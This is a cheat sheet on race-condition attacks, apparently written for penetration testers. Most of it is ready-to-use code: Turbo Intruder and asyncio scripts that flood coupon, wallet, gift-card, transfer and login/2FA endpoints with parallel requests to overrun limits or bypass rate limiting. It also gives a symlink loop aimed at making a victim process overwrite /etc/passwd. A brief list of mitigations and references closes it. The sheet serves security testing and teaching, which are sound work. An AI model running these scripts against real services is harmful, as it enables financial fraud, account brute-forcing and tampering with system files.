# Race Conditions

## Concurrent Request Race (Limit-Overrun)
```
# Common race-prone endpoints:
POST /api/coupon/redeem   {"code":"SAVE50"}
POST /api/wallet/top-up   {"amount":100}
POST /api/gift-card/redeem
POST /api/vote            {"candidate_id":1}
POST /api/inventory/reserve

# Turbo Intruder — Python (Burp extension)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False)
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```
## HTTP/1.1 Last-Byte Sync
```
# Queue all requests, send last byte simultaneously
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```
## HTTP/2 Single-Packet Attack
```
# Burp Suite Repeater method:
1. Send request to Repeater
2. Duplicate 20× (CTRL+R)
3. Create group → add all requests
4. Send group in parallel (single-packet)

# Turbo Intruder single-packet script:
# Use race-single-packet-attack.py from PortSwigger/turbo-intruder
```
## Python asyncio Race Script
```python
import asyncio, aiohttp

async def race(url, data):
    async with aiohttp.ClientSession() as s:
        async with s.post(url, json=data) as r:
            return await r.text()

async def main():
    url = 'http://target.com/api/apply-coupon'
    data = {'coupon': 'FREE50'}
    results = await asyncio.gather(*[race(url, data) for _ in range(20)])
    for r in results:
        print(r)

asyncio.run(main())
```
## Rate-Limit Bypass via Race
```
# Send N requests in parallel before rate-limiter state is written
# Burp Turbo Intruder or single-packet attack
# Common targets: login form, 2FA verify, password reset

engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.queue(request, gate='race1')
engine.openGate('race1')
```
## TOCTOU — File Operations (Symlink Race)
```bash
# Attacker creates symlink during victim's check→use window
while true; do
  ln -sf /etc/passwd /tmp/tempfile.txt
done

# Victim process:
#   1. Checks: /tmp/tempfile.txt exists
#   2. Opens for writing (now a symlink to /etc/passwd)
# Result: victim overwrites /etc/passwd
```
## Multi-Endpoint Race
```
# Request 1: redeem gift card
# Request 2: transfer balance (send before request 1 commits)
# Send both simultaneously via single-packet attack

def queueRequests(target, wordlists):
    engine = RequestEngine(...)
    req1 = 'POST /api/gift/redeem ...'
    req2 = 'POST /api/transfer ...'
    engine.queue(req1, gate='race1')
    for i in range(10):
        engine.queue(req2, gate='race1')
    engine.openGate('race1')
```
## Mitigation Techniques
```
- SELECT ... FOR UPDATE (row-level locking)
- UPDATE ... SET balance = balance - ? WHERE balance >= ? (atomic)
- Unique constraints at DB level (coupon_id + user_id)
- Optimistic locking with version column
- File operations: write to temp path then atomic rename()
- O_NOFOLLOW flag on open() to reject symlinks
```
## References
- [PayloadsAllTheThings Race Condition](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition)
- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
- [Smashing the State Machine — James Kettle](https://portswigger.net/research/smashing-the-state-machine)
